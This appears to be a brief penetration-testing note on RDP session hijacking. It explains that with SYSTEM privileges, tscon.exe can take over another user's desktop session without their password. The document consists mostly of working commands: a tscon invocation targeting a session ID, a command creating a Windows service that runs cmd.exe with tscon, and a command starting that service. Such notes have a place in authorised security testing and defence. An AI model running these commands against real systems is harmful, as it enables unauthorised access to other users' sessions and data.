# RDP Session Hijacking

To successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session. It works by specifying which `SESSION ID` we would like to connect to which session name . So, for example, the following command will open a new console as the specified `SESSION_ID` within our current RDP session:

{% code title="Use "query user" to find out" %}
```cmd-session
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```
{% endcode %}

```cmd-session
sc.exe create sessionhijack binpath= "cmd.exe /k tscon {ID} /dest:{Session-name}
```

```cmd-session
net start sessionhijack
```

\
